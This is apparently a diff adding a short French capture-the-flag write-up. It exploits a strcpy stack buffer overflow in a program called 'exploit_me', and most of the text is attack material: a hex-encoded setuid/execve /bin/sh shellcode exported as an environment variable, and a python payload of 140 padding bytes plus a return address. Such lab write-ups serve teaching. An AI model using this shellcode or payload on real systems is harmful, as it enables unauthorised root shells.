@@ -1,0 +1,10 @@
+On doit faire un buffer overflow avec le strcpy, on voit que le programme reserve 144 octets en memoire :
+80483fa:       81 ec 90 00 00 00       sub    esp,0x90
+
+Du coup on met un shellcode qui nous ouvre un shell dans une variable d'env
+export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
+
+Pour récupérer l'adresse de SHELLCODE, on utilise getenv avec le script getenv.c
+
+Et on passe en argument de exploit_me la commande suivante qui contient l'adresse du shellcode :
+$(python -c 'print "0"*140 + "\xf2\xf8\xff\xbf"')
